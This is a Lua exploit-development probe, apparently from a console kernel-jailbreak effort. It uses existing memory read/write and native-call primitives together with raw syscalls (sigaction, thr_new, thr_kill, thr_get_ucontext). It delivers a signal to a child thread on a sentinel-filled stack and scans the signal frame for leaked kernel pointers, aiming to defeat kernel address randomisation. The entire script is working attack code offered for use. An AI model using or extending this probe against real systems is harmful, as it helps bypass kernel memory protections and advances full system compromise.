-- CRASH_CLASS: MODERATE
-- PROBE 56r: Signal delivery frame kernel stack residue scan
--
-- When kernel delivers a signal, sendsig() pushes a sigframe onto the
-- user stack: ucontext_t (~0x4C0) + siginfo_t (0x80) + handler ptr.
-- If sendsig() doesn't memset the full frame before filling fields,
-- padding bytes may contain kernel stack residue including pointers.
-- This is a DIFFERENT kernel code path from thr_get_ucontext(634).
--
-- Method: spawn child on sentinel-filled stack, deliver SIGUSR1,
-- scan stack for kernel pointers in the sigframe padding.

print("=== PROBE 56r: SIGNAL FRAME KPTR SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local SENTINEL = 0xBBBBBBBB

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))
local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

local JMP_SELF = eaddr(0x15481)

-- ===== Step 1: Set SIGUSR1 handler to jmp$ =====
print("")
print("--- 1: sigaction(SIGUSR1 -> jmp$) ---")
local sc416 = mk(416)

-- struct sigaction: handler(8) + flags(4) + pad(4?) + mask(16)
local act = memory.alloc(0x30)
for i = 0, 0x2C, 4 do wd(N(act) + i, 0) end
wq(act, JMP_SELF)            -- sa_handler = jmp$
wd(N(act) + 8, 0x40)         -- SA_SIGINFO

local ok1, r1 = pcall(function()
    return sc416(uint64(30), uint64(N(act)), uint64(0))
end)
local rv1 = ok1 and N(r1) or -999
print("  ret=" .. rv1)
if rv1 ~= 0 then print("ABORT: sigaction failed"); return end

-- ===== Step 2: Allocate stack, fill with sentinel =====
print("")
print("--- 2: stack setup ---")
local sc477 = mk(477)
local STACK_SZ = 0x10000
local stack = sc477(uint64(0), uint64(STACK_SZ), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sa = N(stack)
print(string.format("  stack=0x%X size=0x%X", sa, STACK_SZ))

-- Fill top 16KB with sentinel (sigframe lands here)
local FILL_START = STACK_SZ - 0x4000
for off = FILL_START, STACK_SZ - 4, 4 do
    wd(sa + off, SENTINEL)
end
print(string.format("  sentinel +0x%X to +0x%X", FILL_START, STACK_SZ - 4))

-- ===== Step 3: Spawn child =====
print("")
print("--- 3: spawn child ---")
local sc455 = mk(455)
local sc433 = mk(433)
local sc632 = mk(632)
local sc633 = mk(633)
local sc634 = mk(634)

local tid_p = memory.alloc(8)
wq(tid_p, uint64(0))

local p = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(p) + i, 0) end
wq(p, JMP_SELF)
wq(uint64(N(p) + 0x08), uint64(0x42424242))
wq(uint64(N(p) + 0x10), uint64(sa))
wq(uint64(N(p) + 0x18), uint64(0xF000))
wq(uint64(N(p) + 0x30), uint64(N(tid_p)))

local ok2, r2 = pcall(function() return sc455(uint64(N(p)), uint64(0x38)) end)
print("  thr_new=" .. (ok2 and tostring(N(r2)) or "FAIL"))

local x = 0; for k = 1, 200000 do x = x + k end
local tid = rd(N(tid_p)) or 0
print("  tid=" .. tid)
if tid <= 0 then print("ABORT: no TID"); return end

-- ===== Step 4: Record initial RSP =====
print("")
print("--- 4: initial RSP ---")
pcall(function() sc632(uint64(tid)) end)
x = 0; for k = 1, 50000 do x = x + k end

local ucx = memory.alloc(0x500)
for i = 0, 0x4FC, 4 do wd(N(ucx) + i, 0) end
pcall(function() sc634(uint64(tid), uint64(N(ucx)), uint64(0x4C0)) end)

local rsp_q = rq(uint64(N(ucx) + 0xF8))
local rsp_before = rsp_q and N(rsp_q) or 0
local rip1 = rq(uint64(N(ucx) + 0xE0))
print(string.format("  RSP=0x%X  RIP=0x%X", rsp_before, rip1 and N(rip1) or 0))

pcall(function() sc633(uint64(tid)) end)

-- ===== Step 5: Deliver SIGUSR1 =====
print("")
print("--- 5: deliver SIGUSR1 ---")
local ok5, r5 = pcall(function()
    return sc433(uint64(tid), uint64(30))
end)
print("  thr_kill(30)=" .. (ok5 and tostring(N(r5)) or "FAIL"))

-- Wait for delivery
x = 0; for k = 1, 500000 do x = x + k end

if not alive() then print("DEAD after signal"); return end

-- ===== Step 6: Post-signal RSP =====
print("")
print("--- 6: post-signal state ---")
pcall(function() sc632(uint64(tid)) end)
x = 0; for k = 1, 50000 do x = x + k end

for i = 0, 0x4FC, 4 do wd(N(ucx) + i, 0) end
pcall(function() sc634(uint64(tid), uint64(N(ucx)), uint64(0x4C0)) end)

local rsp2_q = rq(uint64(N(ucx) + 0xF8))
local rsp_after = rsp2_q and N(rsp2_q) or 0
local rip2 = rq(uint64(N(ucx) + 0xE0))
print(string.format("  RSP=0x%X  RIP=0x%X", rsp_after, rip2 and N(rip2) or 0))

if rsp_before > 0 and rsp_after > 0 then
    if rsp_before > rsp_after then
        local fsz = rsp_before - rsp_after
        print(string.format("  frame_size=0x%X (%d bytes)", fsz, fsz))
    elseif rsp_before == rsp_after then
        print("  WARNING: RSP unchanged — signal may not have been delivered")
    else
        print("  WARNING: RSP grew (unexpected)")
    end
end

pcall(function() sc633(uint64(tid)) end)

-- ===== Step 7: Scan stack for sigframe =====
print("")
print("--- 7: stack scan ---")

local kptr_found = false
local kptr_hits = {}
local mod_count = 0
local first_mod = nil
local last_mod = nil

for off = FILL_START, STACK_SZ - 4, 4 do
    local v = rd(sa + off)
    if v ~= SENTINEL then
        mod_count = mod_count + 1
        if not first_mod then first_mod = off end
        last_mod = off
    end
end

if mod_count == 0 then
    print("  no modified dwords — signal frame not on stack")
    print("  (signal may not have been delivered, or stack region wrong)")
else
    print(string.format("  modified: %d dwords, range +0x%X to +0x%X",
        mod_count, first_mod, last_mod))

    -- Kernel pointer scan across modified region
    for off = first_mod, last_mod, 4 do
        local lo = rd(sa + off)
        local hi = rd(sa + off + 4)
        if lo and hi then
            local ulo = lo; if ulo < 0 then ulo = ulo + 0x100000000 end
            local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
            if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                kptr_found = true
                kptr_hits[#kptr_hits + 1] = {off, uhi, ulo}
                print(string.format("  *** KPTR +0x%X: 0x%08X%08X ***", off, uhi, ulo))
            end
        end
    end

    -- Dump first 256 bytes of sigframe
    print("")
    print("  sigframe first 256B:")
    local dumped = 0
    for off = first_mod, math.min(first_mod + 252, last_mod), 8 do
        local lo = rd(sa + off) or SENTINEL
        local hi = rd(sa + off + 4) or SENTINEL
        if lo ~= SENTINEL or hi ~= SENTINEL then
            local ulo = lo; if ulo < 0 then ulo = ulo + 0x100000000 end
            local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
            print(string.format("    +0x%04X: 0x%08X%08X", off, uhi, ulo))
            dumped = dumped + 1
        end
    end

    -- Also dump last 128 bytes (might contain return address / canary)
    if last_mod - first_mod > 256 then
        print("")
        print("  sigframe last 128B:")
        local tail_start = last_mod - 124
        if tail_start < first_mod + 256 then tail_start = first_mod + 256 end
        for off = tail_start, last_mod, 8 do
            local lo = rd(sa + off) or SENTINEL
            local hi = rd(sa + off + 4) or SENTINEL
            if lo ~= SENTINEL or hi ~= SENTINEL then
                local ulo = lo; if ulo < 0 then ulo = ulo + 0x100000000 end
                local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
                print(string.format("    +0x%04X: 0x%08X%08X", off, uhi, ulo))
            end
        end
    end
end

-- ===== Also scan post-signal ucontext for kptrs =====
print("")
print("--- 8: post-signal ucontext kptr check ---")
local ucx_kptr = false
for off = 0, 0x4BC, 4 do
    local lo = rd(N(ucx) + off)
    local hi = rd(N(ucx) + off + 4)
    if lo and hi and (lo ~= 0 or hi ~= 0) then
        local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
        if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
            ucx_kptr = true
            local ulo = lo; if ulo < 0 then ulo = ulo + 0x100000000 end
            print(string.format("  *** UCX KPTR +0x%X: 0x%08X%08X ***", off, uhi, ulo))
        end
    end
end
if not ucx_kptr then print("  clean") end

print("")
if kptr_found then
    print("*** KERNEL POINTERS FOUND IN SIGFRAME ***")
    for _, h in ipairs(kptr_hits) do
        print(string.format("  +0x%X: 0x%08X%08X", h[1], h[2], h[3]))
    end
elseif ucx_kptr then
    print("*** KERNEL POINTERS FOUND IN POST-SIGNAL UCONTEXT ***")
else
    print("no kernel pointers found")
end
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56r COMPLETE ===")
